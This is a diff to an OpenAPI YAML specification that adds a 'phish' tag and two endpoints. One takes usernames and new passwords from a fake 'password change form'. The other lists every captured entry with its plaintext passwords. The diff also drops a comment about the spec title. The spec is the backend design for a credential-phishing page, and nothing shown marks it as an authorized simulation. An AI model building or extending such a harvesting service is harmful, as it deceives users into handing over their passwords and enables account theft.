@@ -1,6 +1,5 @@
 openapi: 3.1.0
 info:
-  # Do not change the title, if the title changes, the import paths will be broken
   title: Api
   version: 0.1.0
   description: API specification
@@ -10,6 +9,8 @@ servers:
 tags:
   - name: health
     description: Health operations
+  - name: phish
+    description: Phishing form operations
 paths:
   /healthz:
     get:
@@ -24,6 +25,36 @@ paths:
             application/json:
               schema:
                 $ref: "#/components/schemas/HealthStatus"
+  /phish/submit:
+    post:
+      operationId: submitCredentials
+      tags: [phish]
+      summary: Submit password change form
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/SubmitCredentialsBody"
+      responses:
+        "200":
+          description: Submission recorded
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SubmitCredentialsResponse"
+  /phish/entries:
+    get:
+      operationId: getEntries
+      tags: [phish]
+      summary: Get all collected entries
+      responses:
+        "200":
+          description: List of captured entries
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/EntriesResponse"
 components:
   schemas:
     HealthStatus:
@@ -33,4 +64,54 @@ components:
           type: string
       required:
         - status
-
+    SubmitCredentialsBody:
+      type: object
+      properties:
+        username:
+          type: string
+        newPassword:
+          type: string
+        confirmPassword:
+          type: string
+      required:
+        - username
+        - newPassword
+        - confirmPassword
+    SubmitCredentialsResponse:
+      type: object
+      properties:
+        success:
+          type: boolean
+        message:
+          type: string
+      required:
+        - success
+        - message
+    CapturedEntry:
+      type: object
+      properties:
+        id:
+          type: integer
+        username:
+          type: string
+        newPassword:
+          type: string
+        confirmPassword:
+          type: string
+        submittedAt:
+          type: string
+      required:
+        - id
+        - username
+        - newPassword
+        - confirmPassword
+        - submittedAt
+    EntriesResponse:
+      type: object
+      properties:
+        entries:
+          type: array
+          items:
+            $ref: "#/components/schemas/CapturedEntry"
+      required:
+        - entries
